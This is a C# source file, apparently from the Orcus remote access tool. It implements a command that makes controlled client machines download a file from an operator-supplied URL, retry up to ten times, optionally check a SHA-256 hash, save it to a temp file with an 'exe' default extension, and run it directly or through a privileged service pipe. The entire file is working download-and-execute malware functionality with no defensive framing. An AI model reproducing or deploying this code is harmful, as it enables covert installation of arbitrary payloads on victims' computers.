using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.System
{
    public class DownloadAndExecuteFromUrlCommand : StaticCommand
    {
        public DownloadAndExecuteFromUrlCommand()
        {
            this.RegisterProperty(() => DownloadUrl, Resources.StaticCommands.Client_UpdateFromUrlCommand_DownloadUrl,
                    Resources.StaticCommands.Client_UpdateFromUrlCommand_DownloadUrl_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => Hash, Resources.StaticCommands.Client_UpdateFromUrlCommand_FileHash,
                    Resources.StaticCommands.Client_UpdateFromUrlCommand_FileHash_Description,
                    Resources.StaticCommands.FileCheck)
                .RegisterProperty(() => Arguments, Resources.StaticCommands.Arguments,
                    Resources.StaticCommands.ArgumentsDescription, Resources.StaticCommands.Common)
                .RegisterProperty(() => ExecuteUsingService,
                    Resources.StaticCommands.System_DownloadAndExecuteCommand_ExecuteUsingService,
                    Resources.StaticCommands.System_DownloadAndExecuteCommand_ExecuteUsingService_Description,
                    Resources.StaticCommands.Common);
        }

        public string DownloadUrl { get; set; }
        public string Hash { get; set; }
        public string Arguments { get; set; }
        public bool ExecuteUsingService { get; set; }

        public override Guid CommandId { get; } = new Guid(0x9d4dc773, 0xe7fc, 0x6d4a, 0xb2, 0x06, 0x69, 0x7c, 0xe0,
            0x64, 0xad, 0x23);

        public override string Name { get; } = Resources.StaticCommands.System_DownloadAndExecuteFromUrlCommand_Name;

        public override string Description { get; } =
            Resources.StaticCommands.System_DownloadAndExecuteFromUrlCommand_Description;

        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public override InputValidationResult ValidateInput()
        {
            if (DownloadUrl.IsNullOrWhiteSpace())
                return InputValidationResult.Error(Resources.StaticCommands.UrlCannotBeEmpty);

            if (!string.IsNullOrEmpty(Hash) && (Hash?.Length != 64 || !Hash.IsHex()))
                return InputValidationResult.Error(Resources.StaticCommands.InvalidSHA256HashValueHex);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            var downloadHash = string.IsNullOrEmpty(Hash) ? null : StringExtensions.HexToBytes(Hash);

            string downloadFile = null;
            var succeed = false;
            for (int i = 0; i < 10; i++)
            {
                try
                {
                    using (var client = new WebClient())
                    using (var rawStream = client.OpenRead(DownloadUrl))
                    {
                        string extension = null;
                        string contentDisposition = client.ResponseHeaders["content-disposition"];
                        if (!string.IsNullOrEmpty(contentDisposition))
                        {
                            string lookFor = "filename=";
                            int index = contentDisposition.IndexOf(lookFor,
                                StringComparison.CurrentCultureIgnoreCase);
                            if (index >= 0)
                                extension =
                                    Path.GetExtension(
                                            contentDisposition.Substring(index + lookFor.Length).Replace("\"", null))
                                        .Remove(0, 1);
                        }
                        if (extension == null)
                        {
                            var match = Regex.Match(DownloadUrl, @"\.(?<extension>([a-zA-Z]{3,4}))$");
                            extension = !match.Success ? "exe" : match.Groups["extension"].Value;
                        }

                        var tempFile = FileExtensions.GetFreeTempFileName(extension);
                        using (
                            var fileStream = new FileStream(tempFile, FileMode.CreateNew, FileAccess.Write,
                                FileShare.None))
                        {
                            rawStream.CopyToEx(fileStream);
                        }
                        downloadFile = tempFile;
                    }
                }
                catch (Exception)
                {
                    continue;
                }

                Thread.Sleep(100); //wait for the file to close

                if (downloadHash != null)
                {
                    try
                    {
                        byte[] computedHash;
                        using (var stream = File.OpenRead(downloadFile))
                        using (var sha = new SHA256Managed())
                            computedHash = sha.ComputeHash(stream);

                        if (!computedHash.SequenceEqual(downloadHash))
                        {
                            File.Delete(downloadFile);
                            continue;
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                }
                succeed = true;
                break;
            }

            if (!succeed)
            {
                feedbackFactory.Failed("Could not download the file from the given url: " + DownloadUrl);
                return;
            }

            try
            {
                if (ExecuteUsingService && clientInfo.ClientOperator.ToolBase.ServicePipe != null)
                    clientInfo.ClientOperator.ToolBase.ServicePipe.StartProcess(downloadFile, Arguments);
                else
                    Process.Start(downloadFile, Arguments);
            }
            catch (Exception ex)
            {
                feedbackFactory.Failed("Execute file: " + ex.Message);
            }
        }
    }
}